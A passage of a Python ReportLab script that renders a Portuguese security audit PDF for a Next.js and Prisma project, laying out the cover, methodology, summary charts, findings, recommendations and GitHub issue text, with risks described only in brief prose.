        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ROUNDEDCORNERS", [4, 4, 4, 4]),
    ]))
    return t


def build_cover(styles):
    flow = []
    flow.append(Spacer(1, 5.5 * cm))
    flow.append(Paragraph("RELATÓRIO DE AUDITORIA DE SEGURANÇA", ParagraphStyle(
        "eyebrow", fontName="Helvetica-Bold", fontSize=10.5, textColor=colors.HexColor("#E8AE52"),
        spaceAfter=10, tracking=1)))
    flow.append(Paragraph(f"{PROJECT_NAME}", styles["Cover_Title"]))
    flow.append(Spacer(1, 0.4 * cm))
    flow.append(Paragraph(
        "Auditoria de código-fonte cobrindo isolamento de tenant, controle de acesso no servidor, "
        "IDOR, segredos expostos e sanitização de input (XSS).",
        styles["Cover_Sub"]))
    flow.append(Spacer(1, 2.2 * cm))
    label_style = ParagraphStyle("CoverLabel", fontName="Helvetica-Bold", fontSize=9,
                                  leading=12.5, textColor=colors.HexColor("#E8AE52"))
    value_style = ParagraphStyle("CoverValue", fontName="Helvetica", fontSize=9,
                                  leading=12.5, textColor=colors.HexColor("#DCE3EC"))
    meta_rows_raw = [
        ["Repositório", REPO],
        ["Data da auditoria", AUDIT_DATE],
        ["Escopo", "app/, components/, lib/, prisma/, middleware.ts, vercel.json, histórico git"],
        ["Stack detectada", "Next.js 14 (App Router) · TypeScript · Prisma 5 + PostgreSQL · Auth JWT própria (jose) · Deploy Vercel"],
        ["Metodologia", "5 categorias mapeadas para a stack real do projeto (ver Nota Metodológica) — auditoria exaustiva, não amostral"],
    ]
    meta_rows = [[Paragraph(esc(label), label_style), Paragraph(esc(value), value_style)] for label, value in meta_rows_raw]
    t = Table(meta_rows, colWidths=[4.2 * cm, 11.3 * cm])
    t.setStyle(TableStyle([
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("LINEBELOW", (0, 0), (-1, -2), 0.5, colors.HexColor("#2C3E5D")),
        ("TOPPADDING", (0, 0), (-1, -1), 8),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 8),
    ]))
    flow.append(t)
    flow.append(PageBreak())
    return flow


def build_metodologia(styles):
    flow = [Paragraph("Nota metodológica", styles["H2"])]
    flow.append(Paragraph(
        "O roteiro de auditoria original é escrito em termos genéricos (ex.: \"RLS\" para isolamento "
        "de tenant). Como o Lúmen não usa Supabase/RLS, cada categoria foi mapeada para o equivalente "
        "real da stack detectada antes de iniciar a varredura:", styles["Body"]))
    rows = [["Categoria", "Equivalente detectado nesta stack"]]
    for cat, desc in METHODOLOGY:
        rows.append([Paragraph(f"<b>{esc(cat)}</b>", styles["BodySmall"]), Paragraph(esc(desc), styles["BodySmall"])])
    t = Table(rows, colWidths=[4.4 * cm, 11.1 * cm], repeatRows=1)
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor(COR_FUNDO_CAPA)),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, 0), 9),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor(COR_LINHA)),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F7F8FA")]),
    ]))
    flow.append(t)
    flow.append(Spacer(1, 0.3 * cm))
    flow.append(Paragraph(
        "Auditoria exaustiva, não amostral: os 58 arquivos de Server Actions (lib/actions/*.ts) e as "
        "55 rotas de API (app/api/**/route.ts) foram lidos integralmente para as categorias 1, 2 e 3. "
        "Sem Docker/Helm/Terraform neste repositório — deploy é feito via Vercel (vercel.json).",
        styles["Body"]))
    return flow


def build_resumo(styles):
    flow = [Paragraph("Resumo executivo", styles["H2"])]
    counts = {s: 0 for s in SEV_ORDER}
    for f in FINDINGS:
        counts[f["severidade"]] += 1
    total = len(FINDINGS)

    summary_cells = []
    for s in SEV_ORDER:
        if counts[s] == 0 and s not in ("Alta", "Média", "Baixa"):
            continue
        summary_cells.append((s, counts[s]))
    cell_tables = []
    for s, n in summary_cells:
        inner = Table([[str(n)], [s]], colWidths=[2.55 * cm])
        inner.setStyle(TableStyle([
            ("FONTNAME", (0, 0), (0, 0), "Helvetica-Bold"),
            ("FONTSIZE", (0, 0), (0, 0), 20),
            ("FONTNAME", (0, 1), (0, 1), "Helvetica"),
            ("FONTSIZE", (0, 1), (0, 1), 8),
            ("TEXTCOLOR", (0, 0), (0, 0), colors.HexColor(SEV_COLOR[s])),
            ("TEXTCOLOR", (0, 1), (0, 1), colors.HexColor(COR_TEXTO_2)),
            ("ALIGN", (0, 0), (-1, -1), "CENTER"),
            ("TOPPADDING", (0, 0), (0, 0), 6),
            ("BOTTOMPADDING", (0, 0), (0, 0), 1),
            ("TOPPADDING", (0, 1), (0, 1), 1),
            ("LINEABOVE", (0, 0), (0, 0), 2.4, colors.HexColor(SEV_COLOR[s])),
        ]))
        cell_tables.append(inner)
    row = cell_tables
    strip = Table([row], colWidths=[2.75 * cm] * len(row))
    strip.setStyle(TableStyle([
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("BOX", (0, 0), (-1, -1), 0, colors.white),
    ]))
    flow.append(strip)
    flow.append(Spacer(1, 0.5 * cm))

    make_donut()
    make_bars()
    charts_row = Table(
        [[Image(CHART_DONUT, width=6.3 * cm, height=6.3 * cm), Image(CHART_BARS, width=8.7 * cm, height=5.05 * cm)]],
        colWidths=[6.5 * cm, 8.9 * cm],
    )
    charts_row.setStyle(TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE")]))
    flow.append(Paragraph("Achados por severidade e por categoria", styles["H3"]))
    flow.append(charts_row)
    flow.append(Spacer(1, 0.2 * cm))
    flow.append(Paragraph(
        f"Total de <b>{total} achados confirmados</b> em código real, verificados linha a linha — "
        f"nenhum de severidade crítica. A categoria 2 (permissão definida no navegador) não apresentou "
        f"nenhum achado: todo gate de UI encontrado tem verificação equivalente no servidor.",
        styles["Body"]))
    return flow


def build_pontos(styles):
    flow = [Paragraph("Pontos fortes", styles["H2"])]
    flow.append(Paragraph(
        "O que foi verificado e está corretamente protegido — evidência da cobertura da auditoria:",
        styles["Body"]))
    items = []
    for titulo, desc in STRENGTHS:
        items.append(ListItem(Paragraph(f"<b>{esc(titulo)}</b> — {esc(desc)}", styles["BodySmall"]),
                               bulletColor=colors.HexColor(COR_PONTO_FORTE)))
    flow.append(ListFlowable(items, bulletType="bullet", start="●", bulletFontSize=7,
                              leftIndent=14, spaceBefore=4, spaceAfter=10))

    flow.append(Paragraph("Pontos fracos — riscos centrais", styles["H2"]))
    riscos = [
        "Um webhook externo (WhatsApp) aceita dado não autenticado quando um segredo opcional não está configurado — padrão divergente do resto do projeto, que é consistentemente fail-closed.",
        "Duas superfícies de XSS armazenado (e-mail HTML e protocolo javascript: em campos de URL) não têm um ponto central de sanitização, ao contrário do que já existe para o editor de texto rico (lib/richText.ts).",
        "Credenciais reais e sensíveis (senha de administradores) vivem em texto puro no histórico do git via prisma/seed.ts.",
    ]
    items2 = [ListItem(Paragraph(esc(r), styles["BodySmall"]), bulletColor=colors.HexColor(COR_ALTA)) for r in riscos]
    flow.append(ListFlowable(items2, bulletType="bullet", start="●", bulletFontSize=7,
                              leftIndent=14, spaceBefore=4, spaceAfter=6))
    return flow


def build_achados(styles):
    flow = [Paragraph("Achados detalhados", styles["H2"])]
    flow.append(Paragraph(
        "Cada achado foi verificado lendo o código real antes de ser incluído neste relatório.",
        styles["Body"]))

    header = ["Sev.", "Categoria / Arquivo:linha", "Descrição"]
    rows = [header]
    for f in FINDINGS:
        cat_arquivo = Paragraph(f"<b>{esc(f['categoria'])}</b><br/><font face='Courier' size=7.2>{esc(f['arquivo'])}</font>", styles["BodySmall"])
        desc = Paragraph(f"<b>{esc(f['titulo'])}</b><br/>{esc(f['descricao'])}", styles["BodySmall"])
        rows.append([sev_chip(f["severidade"]), cat_arquivo, desc])

    t = Table(rows, colWidths=[2.3 * cm, 5.1 * cm, 8.1 * cm], repeatRows=1)
    style = [
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor(COR_FUNDO_CAPA)),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, 0), 9),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor(COR_LINHA)),
        ("VALIGN", (0, 0), (-1, -1), "TOP"),
        ("ALIGN", (0, 1), (0, -1), "CENTER"),
        ("TOPPADDING", (0, 0), (-1, -1), 7),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 7),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F7F8FA")]),
    ]
    t.setStyle(TableStyle(style))
    flow.append(t)

    # Evidência completa por achado (trecho de código + exploração)
    flow.append(Spacer(1, 0.3 * cm))
    flow.append(Paragraph("Evidência e detalhamento por achado", styles["H3"]))
    for f in FINDINGS:
        trecho_html = esc(f["trecho"]).replace("\n", "<br/>").replace("  ", "&nbsp;&nbsp;")
        block = [
            Spacer(1, 0.15 * cm),
            Table([[sev_chip(f["severidade"]),
                    Paragraph(f"<b>{esc(f['id'])} — {esc(f['titulo'])}</b>", styles["BodySmall"])]],
                  colWidths=[2.3 * cm, 12.8 * cm],
                  style=TableStyle([("VALIGN", (0, 0), (-1, -1), "MIDDLE")])),
            Paragraph(f"<font face='Courier' size=7.6 color='{COR_TEXTO_2}'>{esc(f['arquivo'])}</font>", styles["BodySmall"]),
            Paragraph(trecho_html, styles["Mono"]),
            Paragraph(f"<b>Por que é explorável:</b> {esc(f['exploracao'])}", styles["BodySmall"]),
            Paragraph(f"<b>Condições:</b> {esc(f['condicoes'])}", styles["BodySmall"]),
            Paragraph(f"<b>Correção sugerida:</b> {esc(f['correcao'])}", styles["BodySmall"]),
            HRFlowable(width="100%", thickness=0.5, color=colors.HexColor(COR_LINHA), spaceBefore=8, spaceAfter=4),
        ]
        flow.append(KeepTogether(block))
    return flow


def build_recomendacoes(styles):
    flow = [Paragraph("Recomendações priorizadas", styles["H2"])]
    header = ["Prior.", "Recomendação", "Achado"]
    rows = [header]
    prio_color = {"P1": COR_ALTA, "P2": COR_MEDIA, "P3": COR_BAIXA}
    for p, texto, ref in RECOMMENDATIONS:
        chip = Table([[p]], colWidths=[1.3 * cm], rowHeights=[0.5 * cm])
        chip.setStyle(TableStyle([
            ("BACKGROUND", (0, 0), (-1, -1), colors.HexColor(prio_color[p])),
            ("TEXTCOLOR", (0, 0), (-1, -1), colors.white),
            ("FONTNAME", (0, 0), (-1, -1), "Helvetica-Bold"),
            ("FONTSIZE", (0, 0), (-1, -1), 8.5),
            ("ALIGN", (0, 0), (-1, -1), "CENTER"),
            ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ]))
        rows.append([chip, Paragraph(esc(texto), styles["BodySmall"]), Paragraph(esc(ref), styles["BodySmall"])])
    t = Table(rows, colWidths=[1.6 * cm, 11.9 * cm, 2.0 * cm], repeatRows=1)
    t.setStyle(TableStyle([
        ("BACKGROUND", (0, 0), (-1, 0), colors.HexColor(COR_FUNDO_CAPA)),
        ("TEXTCOLOR", (0, 0), (-1, 0), colors.white),
        ("FONTNAME", (0, 0), (-1, 0), "Helvetica-Bold"),
        ("FONTSIZE", (0, 0), (-1, 0), 9),
        ("GRID", (0, 0), (-1, -1), 0.5, colors.HexColor(COR_LINHA)),
        ("VALIGN", (0, 0), (-1, -1), "MIDDLE"),
        ("ALIGN", (2, 1), (2, -1), "CENTER"),
        ("TOPPADDING", (0, 0), (-1, -1), 6),
        ("BOTTOMPADDING", (0, 0), (-1, -1), 6),
        ("ROWBACKGROUNDS", (0, 1), (-1, -1), [colors.white, colors.HexColor("#F7F8FA")]),
    ]))
    flow.append(t)
    return flow


def build_issues(styles):
    flow = [PageBreak(), Paragraph("Issues para o GitHub", styles["H2"])]
    flow.append(Paragraph(
        "Texto completo em Markdown, pronto para copiar e colar em uma nova issue do repositório.",
        styles["Body"]))
    mono_issue = ParagraphStyle("MonoIssue", parent=styles["Mono"], fontSize=7.0, leading=9.6,
                                 backColor=colors.HexColor("#F3F4F6"))
    for i, issue in enumerate(ISSUES, start=1):
        flow.append(Spacer(1, 0.2 * cm))
        flow.append(Paragraph(f"Issue {i} de {len(ISSUES)}", styles["H3"]))
        marker_top = Paragraph(f"<font face='Courier' size=7.5 color='{COR_TEXTO_2}'>--- ISSUE {i} ---</font>", styles["BodySmall"])
        flow.append(marker_top)
        md = f"**Título:** {issue['titulo']}\n\n**Labels:** {issue['labels']}\n\n{issue['corpo']}"
        # Escapa para o Paragraph (mono) preservando quebras de linha
        esc = (md.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")
               .replace("\n", "<br/>").replace("  ", "&nbsp;&nbsp;"))
        flow.append(Paragraph(esc, mono_issue))
        marker_bot = Paragraph(f"<font face='Courier' size=7.5 color='{COR_TEXTO_2}'>--- FIM ISSUE {i} ---</font>", styles["BodySmall"])
        flow.append(marker_bot)
        flow.append(Spacer(1, 0.35 * cm))
    return flow


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    styles = build_styles()

    doc = SimpleDocTemplate(
        OUT_PDF, pagesize=A4,
        leftMargin=MARGIN, rightMargin=MARGIN, topMargin=1.9 * cm, bottomMargin=1.9 * cm,
        title=REPORT_NAME, author="Auditoria de Segurança (Claude Code)",
    )

    story = []
    story += build_cover(styles)
    story += build_metodologia(styles)
    story.append(PageBreak())
    story += build_resumo(styles)
    story.append(PageBreak())
    story += build_pontos(styles)
    story.append(PageBreak())
    story += build_achados(styles)
    story.append(PageBreak())
    story += build_recomendacoes(styles)
    story += build_issues(styles)

    def on_first(c, d):
        on_page_cover(c, d)

    def on_later(c, d):
        on_page_normal(c, d)

    doc.build(story, onFirstPage=on_first, onLaterPages=on_later)

    for f in (CHART_DONUT, CHART_BARS):
        try:
            os.remove(f)
        except OSError:
            pass

    print(f"PDF gerado em: {OUT_PDF}")


if __name__ == "__main__":
    main()
